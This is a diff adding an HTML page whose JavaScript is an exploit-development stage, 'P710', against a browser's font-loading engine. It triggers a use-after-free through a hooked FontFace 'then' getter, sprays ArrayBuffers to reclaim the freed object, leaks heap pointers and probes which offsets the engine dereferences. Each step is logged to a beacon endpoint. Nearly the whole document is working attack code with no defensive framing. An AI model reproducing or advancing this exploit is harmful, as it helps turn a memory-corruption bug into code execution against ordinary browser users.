@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P710 — q12 self-ref full-P58 dereference chain</title>
+<script>
+'use strict';
+/* ============================================================
+ * P710 — Controlled q12 dereference via self-referencing AB
+ *
+ * P709c proved q12 (+0x60) is the field the engine DEREFERENCES
+ * as a pointer during the load() continuation. With q12=P58 and
+ * everything else zero, the engine followed q12 to our AB, read
+ * some offset, found 0, and crashed (NULL deref at level 2).
+ *
+ * Strategy: fill ALL 24 qwords with P58 (self-referencing).
+ * Every pointer the engine follows resolves to P58 (valid heap).
+ * If the pointer-chase is bounded (2-3 levels, typical for
+ * CSSFontFace→Source→Font), the engine bottoms out at a
+ * non-pointer read and we survive. Then we observe which
+ * qwords the engine CHANGED — those reveal the access pattern.
+ *
+ * If ALL-P58 still crashes (infinite recursion / stack overflow),
+ * Experiment B tries filling q12=P58 plus ONE other qword=P58,
+ * iterating to find the exact secondary dereference offset.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P710-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+var P58 = null;
+var P68 = null;
+var OUT = null;
+
+function log(s){
+  if(!OUT) OUT=document.getElementById('out');
+  if(OUT) OUT.textContent += s + '\n';
+}
+
+function run(){
+  OUT = document.getElementById('out');
+  if(OUT) OUT.textContent = 'P710 — q12 self-ref dereference chain\n\n';
+  b('BOOT','p710-full-p58-selfref');
+  log('Round 1: Baseline leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68));
+    log('');
+    log('Round 2: ALL-P58 self-ref fill...');
+    doExperimentA(function(survived, info){
+      if(survived){
+        log('SURVIVED! Engine access pattern captured.');
+        log(info);
+        b('DONE','p710-survived|'+info);
+      } else {
+        log('Experiment A crashed. Trying Experiment B...');
+        doExperimentB();
+      }
+    });
+  });
+}
+
+/* ---- Round 1: Baseline zeroed UAF to get P58/P68 ---- */
+function doLeak(cb){
+  b('LEAK-GO','round=0');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      log('Leak failed (nz='+bestNz+'), retrying...');
+      doLeakRetry(cb);
+      return;
+    }
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      log('No heap pointer found, retrying...');
+      doLeakRetry(cb);
+      return;
+    }
+    /* Dump full baseline for reference */
+    var dump=[];
+    for(var q=0;q<24;q++){
+      if(v[q] !== 0n) dump.push('q'+q+'=0x'+h16(v[q]));
+    }
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz+'|'+dump.join(','));
+    setTimeout(cb, 200);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){
+      b('LEAK-RETRY-MISS','nz='+bestNz);
+      log('Retry also failed.');
+      return;
+    }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){
+      b('LEAK-RETRY-NOPTR','nz='+bestNz);
+      log('Retry: no pointer.');
+      return;
+    }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 200);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ============================================================
+ * Experiment A: Fill ALL 24 qwords with P58 (self-referencing)
+ *
+ * Every pointer the engine chases resolves to our AB (valid heap).
+ * If the chase is bounded, we survive and observe the writes.
+ * ============================================================ */
+function doExperimentA(cb){
+  b('A-GO','p58=0x'+h16(P58));
+
+  var stA = document.createElement('style');
+  stA.textContent = '@font-face{font-family:aa0;src:local(Arial);unicode-range:U+0045;}';
+  document.head.appendChild(stA);
+
+  var faceA = new FontFace('fa0','local(Helvetica)',{unicodeRange:'U+0046'});
+  document.fonts.add(faceA);
+  void faceA.loaded;
+
+  var absA = [], firedA = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(firedA) return undefined; firedA=true;
+      if(stA){stA.remove(); stA.textContent=''; stA=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      /* Spray: fill ALL 24 qwords with P58 */
+      for(var k=0;k<60;k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        for(var q=0;q<24;q++) view[q] = P58;
+        absA.push(ab);
+      }
+      try{document.fonts.check('1em aa0');}catch(e){}
+      return undefined;
+    }, set:function(){}});
+
+  b('A-PRE','filling-all-24-qwords-with-p58');
+  document.fonts.load('1em fa0, aa0','EF');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    /* Find reclaimed AB */
+    var best=-1, bestScore=0;
+    for(var i=0;i<absA.length;i++){
+      var v = new BigUint64Array(absA[i]);
+      var score = 0;
+      for(var q=0;q<24;q++){
+        if(v[q] !== P58) score++; /* count CHANGED qwords */
+      }
+      if(score > bestScore){ bestScore=score; best=i; }
+    }
+
+    if(best < 0){
+      /* No AB changed — check if any has non-zero (might all still be P58) */
+      for(var i2=0;i2<absA.length;i2++){
+        var u=new Uint8Array(absA[i2]),nz=0;
+        for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+        if(nz>0){best=i2; break;}
+      }
+    }
+
+    if(best < 0){
+      b('A-NO-RECLAIM','no-changed-ab');
+      cb(false, 'no-reclaim');
+      return;
+    }
+
+    var v = new BigUint64Array(absA[best]);
+    var changed = [];
+    var unchanged = [];
+    for(var q=0;q<24;q++){
+      if(v[q] !== P58){
+        changed.push('q'+q+'=0x'+h16(v[q]));
+      } else {
+        unchanged.push('q'+q);
+      }
+    }
+
+    var info = 'changed='+changed.length+'|'+changed.join(',')+'|kept='+unchanged.length;
+    b('A-RESULT', info);
+    log('Changed from P58: ' + changed.join(', '));
+    log('Unchanged (still P58): ' + unchanged.length + ' qwords');
+
+    /* Detailed dump: reads vs writes */
+    var reads = [];
+    var LOW = BigInt('0x1000000000');
+    var HIGH = BigInt('0x80000000000');
+    for(var q2=0;q2<24;q2++){
+      var val = v[q2];
+      if(val !== P58){
+        var kind = 'unknown';
+        if(val === 0n) kind = 'zeroed';
+        else if(val === 1n) kind = 'one';
+        else if(val >= LOW && val < HIGH) kind = 'heap-ptr';
+        else if(val < BigInt(0x10000)) kind = 'small-int';
+        else kind = 'large-val';
+        reads.push('q'+q2+'='+kind+'(0x'+h16(val)+')');
+      }
+    }
+    var detail = reads.join('|');
+    b('A-DETAIL', detail);
+    log('Engine writes detail: ' + detail);
+
+    cb(true, info + '||' + detail);
+  }, 500);
+}
+
+/* ============================================================
+ * Experiment B: Binary search for secondary dereference offset
+ *
+ * q12 = P58, candidate qword = P58, everything else = 0.
+ * Iterate through candidates. The one that survives is the
+ * offset the engine reads from q12's target at level 2.
+ * ============================================================ */
+var B_CANDIDATES = [0,1,2,3,4,5,6,7,8,9,10,11,13,14,15,16,17,18,19,20,21,22,23];
+var B_IDX = 0;
+
+function doExperimentB(){
+  if(B_IDX >= B_CANDIDATES.length){
+    b('B-EXHAUSTED','all-candidates-crashed');
+    log('Experiment B: all candidates crashed. The pointer chase is recursive at +0x60.');
+    return;
+  }
+  var candidate = B_CANDIDATES[B_IDX];
+  B_IDX++;
+
+  b('B-TRY','candidate=q'+candidate+'|idx='+B_IDX);
+  log('Exp B: trying q12=P58 + q'+candidate+'=P58...');
+
+  var stB = document.createElement('style');
+  stB.textContent = '@font-face{font-family:bb'+B_IDX+';src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stB);
+
+  var faceB = new FontFace('fb'+B_IDX,'local(Helvetica)',{unicodeRange:'U+0048'});
+  document.fonts.add(faceB);
+  void faceB.loaded;
+
+  var absB = [], firedB = false;
+  var cand = candidate;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(firedB) return undefined; firedB=true;
+      if(stB){stB.remove(); stB.textContent=''; stB=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<60;k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;     /* q12 = self-reference */
+        view[cand] = P58;   /* candidate = also P58 */
+        absB.push(ab);
+      }
+      try{document.fonts.check('1em bb'+B_IDX);}catch(e){}
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fb'+B_IDX+', bb'+B_IDX,'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best=-1, bestNz=0;
+    for(var i=0;i<absB.length;i++){
+      var u=new Uint8Array(absB[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('B-MISS','candidate=q'+cand+'|nz='+bestNz);
+      /* This candidate didn't reclaim, try next */
+      setTimeout(function(){ doExperimentB(); }, 300);
+      return;
+    }
+
+    var v = new BigUint64Array(absB[best]);
+    var changed = [];
+    for(var q=0;q<24;q++){
+      var exp = (q===12 || q===cand) ? P58 : 0n;
+      if(v[q] !== exp) changed.push('q'+q+'=0x'+h16(v[q]));
+    }
+
+    b('B-SURVIVED','candidate=q'+cand+'|nz='+bestNz+'|ch='+changed.join(','));
+    log('Exp B: q'+cand+' SURVIVED! Changes: ' + changed.join(', '));
+    log('');
+    log('SECONDARY DEREF OFFSET = q'+cand+' (+0x'+((cand*8).toString(16))+')');
+
+    /* Now do a full dump for analysis */
+    var dump = [];
+    for(var q2=0;q2<24;q2++){
+      if(v[q2] !== 0n) dump.push('q'+q2+'=0x'+h16(v[q2]));
+    }
+    b('B-DUMP','candidate=q'+cand+'|'+dump.join(','));
+
+    b('DONE','p710-b-survived-q'+cand);
+  }, 500);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P710 — Loading...</pre></body></html>
